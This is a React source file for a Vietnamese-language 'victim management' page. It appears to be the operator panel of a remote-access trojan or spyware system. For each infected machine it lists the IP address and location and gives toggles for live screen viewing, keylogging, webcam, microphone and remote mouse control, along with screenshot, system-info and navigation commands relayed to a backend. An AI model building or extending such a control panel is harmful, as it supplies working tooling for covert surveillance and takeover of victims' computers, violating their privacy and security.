import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import {
  Users,
  Monitor,
  Wifi,
  WifiOff,
  Eye,
  Keyboard,
  Camera,
  Mic,
  MousePointer,
  Download,
  Upload,
  Terminal,
  Folder,
  Play,
  Pause,
  Square,
  RefreshCw,
  AlertCircle,
  CheckCircle,
  Clock,
  HardDrive,
  Cpu,
  MemoryStick,
  Shield,
  Settings,
  Search,
  Filter,
  MoreHorizontal,
  Trash2,
  Edit,
} from "lucide-react";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { Badge } from "../components/ui/badge";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "../components/ui/card";
import { restAdaptor } from "../adaptors";
import { useSocket } from "../hooks/useSocket";
import { useToast } from "../components/ui/use-toast";

const VictimManagementPage = () => {
  const [victims, setVictims] = useState([]);
  const [selectedVictim, setSelectedVictim] = useState(null);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterStatus, setFilterStatus] = useState("all"); // all, online, offline
  const [commandLoading, setCommandLoading] = useState(new Map());
  const { socket, isConnected } = useSocket();
  const { toast } = useToast();

  // Load victims data
  useEffect(() => {
    const loadVictims = async () => {
      try {
        setLoading(true);
        const response = await restAdaptor.get("/victims");
        if (response.success) {
          setVictims(response.data);
        }
      } catch (error) {
        toast({
          title: "Lỗi!",
          description: "Không thể tải danh sách victims",
          variant: "destructive",
        });
      } finally {
        setLoading(false);
      }
    };

    loadVictims();
  }, [toast]);

  // WebSocket realtime updates
  useEffect(() => {
    if (!socket) return;

    const handleVictimUpdate = (update) => {
      setVictims((prev) =>
        prev.map((victim) =>
          victim.id === update.id ? { ...victim, ...update } : victim
        )
      );
    };

    const handleVictimConnect = (victim) => {
      setVictims((prev) => {
        const exists = prev.find((v) => v.id === victim.id);
        if (exists) {
          return prev.map((v) =>
            v.id === victim.id
              ? { ...v, status: "online", lastSeen: new Date() }
              : v
          );
        }
        return [...prev, { ...victim, status: "online" }];
      });

      toast({
        title: "Victim kết nối",
        description: `${victim.name} đã kết nối`,
        variant: "default",
      });
    };

    const handleVictimDisconnect = (victimId) => {
      setVictims((prev) =>
        prev.map((victim) =>
          victim.id === victimId
            ? { ...victim, status: "offline", lastSeen: new Date() }
            : victim
        )
      );

      toast({
        title: "Victim ngắt kết nối",
        description: `Victim ${victimId} đã ngắt kết nối`,
        variant: "destructive",
      });
    };

    socket.on("victim:update", handleVictimUpdate);
    socket.on("victim:connect", handleVictimConnect);
    socket.on("victim:disconnect", handleVictimDisconnect);

    return () => {
      socket.off("victim:update", handleVictimUpdate);
      socket.off("victim:connect", handleVictimConnect);
      socket.off("victim:disconnect", handleVictimDisconnect);
    };
  }, [socket, toast]);

  // Filter victims
  const filteredVictims = victims.filter((victim) => {
    const matchesSearch =
      victim.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      victim.ip.includes(searchQuery) ||
      victim.location.toLowerCase().includes(searchQuery.toLowerCase());

    const matchesFilter =
      filterStatus === "all" || victim.status === filterStatus;

    return matchesSearch && matchesFilter;
  });

  // Send command to victim
  const sendCommand = async (victimId, command, params = {}) => {
    const commandKey = `${victimId}-${command}`;

    if (commandLoading.get(commandKey)) return;

    setCommandLoading((prev) => new Map(prev).set(commandKey, true));

    try {
      const response = await restAdaptor.post(`/victims/${victimId}/commands`, {
        command,
        params,
      });

      if (response.success) {
        toast({
          title: "Thành công!",
          description: `Lệnh '${command}' đã được gửi đến ${victimId}`,
          variant: "default",
        });
      }
    } catch (error) {
      toast({
        title: "Lỗi!",
        description: `Không thể gửi lệnh '${command}': ${error.message}`,
        variant: "destructive",
      });
    } finally {
      setCommandLoading((prev) => {
        const newMap = new Map(prev);
        newMap.delete(commandKey);
        return newMap;
      });
    }
  };

  // Toggle victim action
  const toggleAction = async (victimId, actionType, currentState) => {
    const actionKey = `${victimId}-${actionType}`;

    if (commandLoading.get(actionKey)) return;

    setCommandLoading((prev) => new Map(prev).set(actionKey, true));

    try {
      const newActions = { [actionType]: !currentState };
      const response = await restAdaptor.put(`/victims/${victimId}/actions`, {
        actions: newActions,
      });

      if (response.success) {
        setVictims((prev) =>
          prev.map((victim) =>
            victim.id === victimId
              ? { ...victim, actions: { ...victim.actions, ...newActions } }
              : victim
          )
        );

        toast({
          title: "Thành công!",
          description: `${actionType} đã được ${
            !currentState ? "bật" : "tắt"
          } cho ${victimId}`,
          variant: "default",
        });
      }
    } catch (error) {
      toast({
        title: "Lỗi!",
        description: `Không thể cập nhật ${actionType}: ${error.message}`,
        variant: "destructive",
      });
    } finally {
      setCommandLoading((prev) => {
        const newMap = new Map(prev);
        newMap.delete(actionKey);
        return newMap;
      });
    }
  };

  const ActionToggleButton = ({
    victimId,
    actionType,
    isActive,
    icon: Icon,
    label,
  }) => {
    const actionKey = `${victimId}-${actionType}`;
    const isLoading = commandLoading.get(actionKey);

    return (
      <Button
        size="sm"
        variant={isActive ? "default" : "outline"}
        onClick={() => {
          toggleAction(victimId, actionType, isActive);
          toast({
            title: `🔄 ${label} Action`,
            description: `${
              isActive ? "Đang tắt" : "Đang bật"
            } ${label.toLowerCase()} cho victim ${victimId}`,
            duration: 2000,
          });
        }}
        disabled={isLoading}
        className={`h-8 px-3 transition-all duration-200 hover:scale-105 active:scale-95 ${
          isActive
            ? "bg-green-600 hover:bg-green-700 hover:shadow-green-500/25"
            : "hover:bg-gray-700 hover:shadow-md"
        } ${isLoading ? "opacity-50 cursor-not-allowed hover:scale-100" : ""}`}
      >
        {isLoading ? (
          <RefreshCw className="w-4 h-4 animate-spin" />
        ) : (
          <Icon className="w-4 h-4" />
        )}
        <span className="ml-1 text-xs">{label}</span>
      </Button>
    );
  };

  const CommandButton = ({
    victimId,
    command,
    icon: Icon,
    label,
    params = {},
  }) => {
    const commandKey = `${victimId}-${command}`;
    const isLoading = commandLoading.get(commandKey);

    return (
      <Button
        size="sm"
        variant="outline"
        onClick={() => {
          sendCommand(victimId, command, params);
          toast({
            title: `⚡ ${label} Command`,
            description: `Đang thực thi ${label.toLowerCase()} trên victim ${victimId}`,
            duration: 2000,
          });
        }}
        disabled={isLoading}
        className="h-8 px-3 hover:bg-blue-600/20 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-blue-500/20 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
      >
        {isLoading ? (
          <RefreshCw className="w-4 h-4 animate-spin" />
        ) : (
          <Icon className="w-4 h-4" />
        )}
        <span className="ml-1 text-xs">{label}</span>
      </Button>
    );
  };

  const StatusBadge = ({ status }) => {
    const config = {
      online: {
        color: "bg-green-500/20 text-green-400 border-green-500/30",
        icon: Wifi,
      },
      offline: {
        color: "bg-red-500/20 text-red-400 border-red-500/30",
        icon: WifiOff,
      },
    };

    const { color, icon: StatusIcon } = config[status] || config.offline;

    return (
      <Badge className={`${color} border flex items-center gap-1`}>
        <StatusIcon className="w-3 h-3" />
        {status === "online" ? "Trực tuyến" : "Ngoại tuyến"}
      </Badge>
    );
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-12 h-12 animate-spin mx-auto mb-4 text-blue-500" />
          <p>Đang tải danh sách victims...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-7xl mx-auto"
      >
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center justify-between mb-6">
            <div>
              <h1 className="text-3xl font-bold flex items-center gap-3">
                <Users className="w-8 h-8 text-blue-500" />
                Quản lý Victims
              </h1>
              <p className="text-gray-400 mt-2">
                Giám sát và điều khiển {victims.length} victims (
                {victims.filter((v) => v.status === "online").length} trực
                tuyến)
              </p>
            </div>
            <div className="flex items-center gap-2">
              <Badge
                className={`${
                  isConnected
                    ? "bg-green-500/20 text-green-400"
                    : "bg-red-500/20 text-red-400"
                } border-0`}
              >
                {isConnected ? "Realtime ON" : "Realtime OFF"}
              </Badge>
              <Button
                onClick={() => {
                  window.location.reload();
                  toast({
                    title: "🔄 Refreshing Page",
                    description:
                      "Đang tải lại trang để cập nhật dữ liệu mới nhất",
                    duration: 2000,
                  });
                }}
                variant="outline"
                className="border-gray-600 hover:bg-gray-700 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-md"
              >
                <RefreshCw className="w-4 h-4 mr-2" />
                Làm mới
              </Button>
            </div>
          </div>

          {/* Search and Filters */}
          <div className="flex gap-4 mb-6">
            <div className="relative flex-1">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400" />
              <Input
                placeholder="Tìm kiếm theo tên, IP, địa điểm..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-10 bg-gray-800 border-gray-600 text-white"
              />
            </div>
            <select
              value={filterStatus}
              onChange={(e) => setFilterStatus(e.target.value)}
              className="px-4 py-2 bg-gray-800 border border-gray-600 rounded-md text-white"
            >
              <option value="all">Tất cả trạng thái</option>
              <option value="online">Trực tuyến</option>
              <option value="offline">Ngoại tuyến</option>
            </select>
          </div>
        </div>

        {/* Victims Grid */}
        <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
          {filteredVictims.map((victim) => (
            <motion.div
              key={victim.id}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              whileHover={{ scale: 1.02 }}
              transition={{ duration: 0.2 }}
            >
              <Card className="bg-gray-800/70 border-gray-700 hover:border-gray-600 transition-colors">
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-lg flex items-center gap-2">
                      <Monitor className="w-5 h-5 text-blue-500" />
                      {victim.name}
                    </CardTitle>
                    <StatusBadge status={victim.status} />
                  </div>
                  <div className="text-sm text-gray-400 space-y-1">
                    <div className="flex items-center gap-2">
                      <span>📍 {victim.location}</span>
                      <span>•</span>
                      <span>🌐 {victim.ip}</span>
                    </div>
                    <div>
                      💻 {victim.device} • 📊 {victim.data} • 🕒{" "}
                      {victim.sessions} phiên
                    </div>
                    {victim.status === "offline" && (
                      <div className="text-xs text-red-400">
                        Lần cuối:{" "}
                        {new Date(victim.lastSeen).toLocaleString("vi-VN")}
                      </div>
                    )}
                  </div>
                </CardHeader>

                <CardContent className="space-y-4">
                  {/* Action Toggles */}
                  <div>
                    <h4 className="text-sm font-medium mb-2 text-gray-300">
                      Điều khiển:
                    </h4>
                    <div className="flex flex-wrap gap-2">
                      <ActionToggleButton
                        victimId={victim.id}
                        actionType="screen"
                        isActive={victim.actions.screen}
                        icon={Eye}
                        label="Screen"
                      />
                      <ActionToggleButton
                        victimId={victim.id}
                        actionType="keylog"
                        isActive={victim.actions.keylog}
                        icon={Keyboard}
                        label="Keylog"
                      />
                      <ActionToggleButton
                        victimId={victim.id}
                        actionType="webcam"
                        isActive={victim.actions.webcam}
                        icon={Camera}
                        label="Webcam"
                      />
                      <ActionToggleButton
                        victimId={victim.id}
                        actionType="mic"
                        isActive={victim.actions.mic}
                        icon={Mic}
                        label="Mic"
                      />
                      <ActionToggleButton
                        victimId={victim.id}
                        actionType="control"
                        isActive={victim.actions.control}
                        icon={MousePointer}
                        label="Control"
                      />
                    </div>
                  </div>

                  {/* Command Buttons */}
                  <div>
                    <h4 className="text-sm font-medium mb-2 text-gray-300">
                      Lệnh nhanh:
                    </h4>
                    <div className="flex flex-wrap gap-2">
                      <CommandButton
                        victimId={victim.id}
                        command="screenshot"
                        icon={Camera}
                        label="Screenshot"
                      />
                      <CommandButton
                        victimId={victim.id}
                        command="system_info"
                        icon={Cpu}
                        label="System Info"
                      />
                      <CommandButton
                        victimId={victim.id}
                        command="navigate"
                        icon={Monitor}
                        label="Navigate"
                        params={{ url: "https://google.com" }}
                      />
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => setSelectedVictim(victim)}
                        className="h-8 px-3 hover:bg-purple-600/20"
                      >
                        <Settings className="w-4 h-4 mr-1" />
                        <span className="text-xs">Chi tiết</span>
                      </Button>
                    </div>
                  </div>

                  {/* System Info Preview */}
                  {victim.systemInfo && (
                    <div className="bg-gray-900/50 rounded-lg p-3">
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <div>
                          <span className="text-gray-400">CPU:</span>
                          <div className="text-white truncate">
                            {victim.systemInfo.cpu}
                          </div>
                        </div>
                        <div>
                          <span className="text-gray-400">RAM:</span>
                          <div className="text-white">
                            {victim.systemInfo.ram}
                          </div>
                        </div>
                        <div>
                          <span className="text-gray-400">OS:</span>
                          <div className="text-white truncate">
                            {victim.systemInfo.os}
                          </div>
                        </div>
                        <div>
                          <span className="text-gray-400">Uptime:</span>
                          <div className="text-white">
                            {victim.systemInfo.uptime}
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </motion.div>
          ))}
        </div>

        {filteredVictims.length === 0 && (
          <div className="text-center py-12">
            <Users className="w-16 h-16 mx-auto mb-4 text-gray-600" />
            <h3 className="text-xl font-medium text-gray-400 mb-2">
              Không tìm thấy victims
            </h3>
            <p className="text-gray-500">
              {searchQuery || filterStatus !== "all"
                ? "Thử thay đổi bộ lọc hoặc từ khóa tìm kiếm"
                : "Chưa có victims nào kết nối"}
            </p>
          </div>
        )}

        {/* Selected Victim Detail Modal would go here */}
        {selectedVictim && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="bg-gray-800 rounded-lg p-6 max-w-2xl w-full max-h-[80vh] overflow-y-auto"
            >
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-2xl font-bold">
                  {selectedVictim.name} - Chi tiết
                </h2>
                <Button
                  variant="ghost"
                  onClick={() => setSelectedVictim(null)}
                  className="text-gray-400 hover:text-white"
                >
                  ✕
                </Button>
              </div>

              {/* Detailed victim info would go here */}
              <div className="space-y-4">
                <pre className="bg-gray-900 p-4 rounded text-xs overflow-x-auto">
                  {JSON.stringify(selectedVictim, null, 2)}
                </pre>
              </div>
            </motion.div>
          </div>
        )}
      </motion.div>
    </div>
  );
};

export default VictimManagementPage;
